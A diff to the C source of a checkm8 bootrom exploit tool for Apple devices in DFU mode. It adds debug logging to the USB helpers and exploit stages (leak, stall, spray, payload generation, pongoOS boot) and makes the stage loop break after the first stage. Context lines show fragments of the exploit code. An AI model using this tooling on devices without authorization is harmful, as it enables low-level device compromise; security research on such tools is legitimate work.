@@ -152,6 +152,7 @@ sleep_ms(unsigned ms)
 static void
 close_usb_handle(usb_handle_t *handle)
 {
+    LOG_DEBUG("close_usb_habdle");
     libusb_close(handle->device);
     libusb_exit(NULL);
 }
@@ -159,6 +160,7 @@ close_usb_handle(usb_handle_t *handle)
 static void
 reset_usb_handle(const usb_handle_t *handle)
 {
+    LOG_DEBUG("reset_usb_handle");
     libusb_reset_device(handle->device);
 }
 
@@ -167,6 +169,7 @@ wait_usb_handle(usb_handle_t *handle,
                 usb_check_cb_t usb_check_cb,
                 void *arg)
 {
+    LOG_DEBUG("wait_usb_handle");
     if(libusb_init(NULL) == LIBUSB_SUCCESS)
     {
         for(;;)
@@ -188,6 +191,7 @@ wait_usb_handle(usb_handle_t *handle,
 static void
 usb_async_cb(struct libusb_transfer *transfer)
 {
+    LOG_DEBUG("usb_async_cb");
     *(int *)transfer->user_data = 1;
 }
 
@@ -201,6 +205,7 @@ send_usb_control_request(const usb_handle_t *handle,
                          size_t w_len,
                          transfer_ret_t *transfer_ret)
 {
+    LOG_DEBUG("usb_control_request");
     int ret = libusb_control_transfer(handle->device, bm_request_type, b_request, w_value, w_index, p_data, (uint16_t)w_len, usb_timeout);
     
     if(transfer_ret != NULL)
@@ -237,6 +242,7 @@ send_usb_control_request_async(const usb_handle_t *handle,
                                unsigned usb_abort_timeout,
                                transfer_ret_t *transfer_ret)
 {
+    LOG_DEBUG("send_usb_control_request_async");
     struct libusb_transfer *transfer = libusb_alloc_transfer(0);
     struct timeval tv;
     int completed = 0;
@@ -300,6 +306,7 @@ init_usb_handle(usb_handle_t *handle,
                 uint16_t vid,
                 uint16_t pid)
 {
+    LOG_DEBUG("init_usb_handle");
     handle->vid = vid;
     handle->pid = pid;
     handle->device = NULL;
@@ -311,6 +318,7 @@ cf_dictionary_set_int16(CFMutableDictionaryRef dict,
                         const void *key,
                         uint16_t val)
 {
+    LOG_DEBUG("cf_dectionary_set_int16");
     CFNumberRef cf_val = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt16Type, &val);
     
     if(cf_val != NULL)
@@ -326,6 +334,7 @@ query_usb_interface(io_service_t serv,
                     CFUUIDRef interface_type,
                     LPVOID *interface)
 {
+    LOG_DEBUG("query_usb_interface");
     IOCFPlugInInterface **plugin_interface;
     bool ret = false;
     SInt32 score;
@@ -342,6 +351,7 @@ query_usb_interface(io_service_t serv,
 static void
 close_usb_device(usb_handle_t *handle)
 {
+    LOG_DEBUG("close_usb_device");
     CFRunLoopRemoveSource(CFRunLoopGetCurrent(), handle->async_event_source, kCFRunLoopDefaultMode);
     CFRelease(handle->async_event_source);
     (*handle->device)->USBDeviceClose(handle->device);
@@ -351,6 +361,7 @@ close_usb_device(usb_handle_t *handle)
 static void
 close_usb_handle(usb_handle_t *handle)
 {
+    LOG_DEBUG("close_usb_handle");
     close_usb_device(handle);
 }
 
@@ -358,6 +369,7 @@ static bool
 open_usb_device(io_service_t serv,
                 usb_handle_t *handle)
 {
+    LOG_DEBUG("open_usb_device");
     bool ret = false;
     
     if(query_usb_interface(serv, kIOUSBDeviceUserClientTypeID, kIOUSBDeviceInterfaceID320, (LPVOID *)&handle->device))
@@ -388,6 +400,7 @@ wait_usb_handle(usb_handle_t *handle,
                 usb_check_cb_t usb_check_cb,
                 void *arg)
 {
+    LOG_DEBUG("wait_usb_handle");
     CFMutableDictionaryRef matching_dict;
     const char *darwin_device_class;
     io_iterator_t iter;
@@ -431,6 +444,7 @@ wait_usb_handle(usb_handle_t *handle,
 static void
 reset_usb_handle(usb_handle_t *handle)
 {
+    LOG_DEBUG("reset_usb_handle");
     (*handle->device)->ResetDevice(handle->device);
     (*handle->device)->USBDeviceReEnumerate(handle->device, 0);
 }
@@ -440,6 +454,7 @@ usb_async_cb(void *refcon,
              IOReturn ret,
              void *arg)
 {
+    LOG_DEBUG("usb_async_cb");
     transfer_ret_t *transfer_ret = refcon;
     
     if(transfer_ret != NULL)
@@ -479,6 +494,7 @@ send_usb_control_request(const usb_handle_t *handle,
                          size_t w_len,
                          transfer_ret_t *transfer_ret)
 {
+    LOG_DEBUG("send_usb_control_request");
     IOUSBDevRequestTO req;
     IOReturn ret;
     
@@ -529,6 +545,7 @@ send_usb_control_request_async(const usb_handle_t *handle,
                                unsigned usb_abort_timeout,
                                transfer_ret_t *transfer_ret)
 {
+    LOG_DEBUG("send_usb_control_request_async");
     IOUSBDevRequestTO req;
     
     req.wLenDone = 0;
@@ -554,6 +571,7 @@ send_usb_control_request_async(const usb_handle_t *handle,
 static void
 init_usb_handle(usb_handle_t *handle, uint16_t vid, uint16_t pid)
 {
+    LOG_DEBUG("init_usb_handle");
     handle->vid = vid;
     handle->pid = pid;
     handle->device = NULL;
@@ -570,6 +588,7 @@ send_usb_control_request_no_data(const usb_handle_t *handle,
                                  size_t w_len,
                                  transfer_ret_t *transfer_ret)
 {
+    LOG_DEBUG("send_usb_consol_request_no_data");
     bool ret = false;
     void *p_data;
     
@@ -596,6 +615,7 @@ send_usb_control_request_async_no_data(const usb_handle_t *handle,
                                        unsigned usb_abort_timeout,
                                        transfer_ret_t *transfer_ret)
 {
+    LOG_DEBUG("send_usb_control_request_async_no_data");
     bool ret = false;
     void *p_data;
     
@@ -615,6 +635,7 @@ send_usb_control_request_async_no_data(const usb_handle_t *handle,
 static char *
 get_usb_serial_number(usb_handle_t *handle)
 {
+    LOG_DEBUG("get_usb_serial_number");
     transfer_ret_t transfer_ret;
     uint8_t buf[UINT8_MAX];
     char *str = NULL;
@@ -642,6 +663,7 @@ static bool
 checkm8_check_usb_device(usb_handle_t *handle,
                          void *pwned)
 {
+    LOG_DEBUG("checkm8_check_usb_device");
     char *usb_serial_num = get_usb_serial_number(handle);
     bool ret = false;
     
@@ -815,6 +837,7 @@ dfu_check_status(const usb_handle_t *handle,
                  uint8_t status,
                  uint8_t state)
 {
+    LOG_DEBUG("dfu_check_status");
     struct
     {
         uint8_t status;
@@ -843,6 +866,7 @@ dfu_check_status(const usb_handle_t *handle,
 static bool
 dfu_set_state_wait_reset(const usb_handle_t *handle)
 {
+    LOG_DEBUG("dfu_set_state_wait_reset");
     transfer_ret_t transfer_ret;
     
     // usb_ctrl_req(0x21, 1, 0, 0)
@@ -865,6 +889,7 @@ dfu_set_state_wait_reset(const usb_handle_t *handle)
 static bool
 checkm8_stage_reset(const usb_handle_t *handle)
 {
+    LOG_DEBUG("checkm8_stage_reset");
     transfer_ret_t transfer_ret;
     
     // usb_ctrl_req(0x21, 1, 0, 0)
@@ -893,6 +918,7 @@ checkm8_stage_reset(const usb_handle_t *handle)
 static bool
 checkm8_stage_setup(const usb_handle_t *handle)
 {
+    LOG_DEBUG("checkm8_stage_setup");
     unsigned usb_abort_timeout = usb_timeout - 1;
     transfer_ret_t transfer_ret;
     
@@ -922,6 +948,7 @@ checkm8_stage_setup(const usb_handle_t *handle)
 static bool
 checkm8_usb_request_leak(const usb_handle_t *handle)
 {
+    LOG_DEBUG("checkm8_usb_request_leak");
     transfer_ret_t transfer_ret;
     
     if(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transfer_ret))
@@ -937,6 +964,7 @@ checkm8_usb_request_leak(const usb_handle_t *handle)
 static void
 checkm8_stall(const usb_handle_t *handle)
 {
+    LOG_DEBUG("checkm8_stall");
     unsigned usb_abort_timeout = usb_timeout - 1;
     transfer_ret_t transfer_ret;
     
@@ -959,6 +987,7 @@ checkm8_stall(const usb_handle_t *handle)
 static bool
 checkm8_no_leak(const usb_handle_t *handle)
 {
+    LOG_DEBUG("checkm8_no_leak");
     transfer_ret_t transfer_ret;
     
     if(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ + 1, 1, &transfer_ret))
@@ -974,6 +1003,7 @@ checkm8_no_leak(const usb_handle_t *handle)
 static bool
 checkm8_usb_request_stall(const usb_handle_t *handle)
 {
+    LOG_DEBUG("checkm8_usb_request_stall");
     transfer_ret_t transfer_ret;
     
     if(send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, &transfer_ret))
@@ -989,6 +1019,7 @@ checkm8_usb_request_stall(const usb_handle_t *handle)
 static bool
 checkm8_stage_spray(const usb_handle_t *handle)
 {
+    LOG_DEBUG("checkm8_stage_spray");
     size_t i;
     
     if(cpid == 0x7001 || cpid == 0x7000 || cpid == 0x7002 || cpid == 0x8003 || cpid == 0x8000)
@@ -1012,6 +1043,7 @@ checkm8_stage_spray(const usb_handle_t *handle)
 static bool
 generate_stage1(void** outbuf, size_t* outlen, void* payload, size_t payload_sz, uint16_t cpid)
 {
+    LOG_DEBUG("generate_stage1");
     bool wnx = false;
     uint64_t write_gadget = 0;
     uint32_t write_val = 0;
@@ -1195,6 +1227,7 @@ fail:
 static bool
 checkm8_stage_patch(const usb_handle_t *handle)
 {
+    LOG_DEBUG("checkm8_stage_patch");
     size_t i, data_sz, packet_sz;
     uint8_t *data;
     transfer_ret_t transfer_ret;
@@ -1323,6 +1356,7 @@ static void compress_pongo(void *out,
 
 static bool checkm8_boot_pongo(usb_handle_t *handle)
 {
+    LOG_DEBUG("checkm8_boot_pongo");
     transfer_ret_t transfer_ret;
     LOG_INFO("Booting pongoOS");
     LOG_DEBUG("Compressing pongoOS");
@@ -1380,6 +1414,7 @@ static bool checkm8_boot_pongo(usb_handle_t *handle)
 static bool
 gaster_checkm8(usb_handle_t *handle)
 {
+    LOG_DEBUG("gaster_checkm8");
     enum
     {
         STAGE_RESET,
@@ -1420,6 +1455,13 @@ gaster_checkm8(usb_handle_t *handle)
             if(ret)
             {
                 LOG_DEBUG("Stage %d succeeded", stage);
+                LOG_DEBUG("1459");
+                if(stage == 0) {
+                    reset_usb_handle(handle);
+                    close_usb_handle(handle);
+                    LOG_INFO("breaking gaster_checkm8()");
+                    break;
+                }
             }
             else
             {
@@ -1445,8 +1487,12 @@ int main(int argc, char **argv)
     usb_timeout = 5;
     usb_abort_timeout_min = 0;
     LOG_INFO("Waiting for DFU mode device");
+    LOG_INFO("runnning gaster_checkm8()");
     gaster_checkm8(&handle);
-    sleep_ms(3000);
+    LOG_INFO("gaster_checkm8() succeeded");
+    sleep_ms(10000);
+    LOG_INFO("runnning checkm8_boot_pongo()");
     checkm8_boot_pongo(&handle);
+    LOG_INFO("checkm8_boot_pongo() succeeded");
     return ret;
 }
